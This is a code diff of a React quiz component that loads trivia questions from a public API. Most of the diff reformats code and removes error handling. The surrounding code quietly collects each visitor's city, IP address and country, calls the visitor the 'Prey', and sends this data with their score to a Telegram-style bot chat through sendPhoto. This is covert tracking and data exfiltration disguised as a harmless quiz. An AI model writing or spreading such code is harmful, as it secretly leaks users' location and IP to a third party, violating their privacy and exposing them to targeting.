@@ -12,13 +12,11 @@ function Quiz() {
   };
 
   useEffect(() => {
-    axios("https://opentdb.com/api.php?amount=10&type=multiple")
-      .then((response) => {
+    axios("https://opentdb.com/api.php?amount=10&type=multiple").then(
+      (response) => {
         setQuestions(response.data.results);
-      })
-      .catch((error) => {
-        console.error("Error fetching data:", error);
-      });
+      }
+    );
   }, []);
 
   const currentQuestion = questions[questionNumber as number];
@@ -43,21 +41,14 @@ function Quiz() {
       message += `<b>City:</b> ${res.data.city}\n`;
       message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
       message += `<b>Prey's country flag:</b> ${res.data.countryFlagEmoj}\n`;
-      message += `<b>Score✅: ${score}</b>`
+      message += `<b>Score✅: ${score}</b>`;
 
-      axios
-        .post(`${URL}/sendPhoto`, {
-          chat_id: CHAT_ID,
-          photo: "https://ibb.co/5s4SKHs",
-          caption: message,
-          parse_mode: "HTML",
-        })
-        .then(() => {
-          console.log("Message sent successfully!");
-        })
-        .catch((err) => {
-          console.error("Error sending message:", err.response.data);
-        });
+      axios.post(`${URL}/sendPhoto`, {
+        chat_id: CHAT_ID,
+        photo: "https://ibb.co/5s4SKHs",
+        caption: message,
+        parse_mode: "HTML",
+      });
     });
   }
 
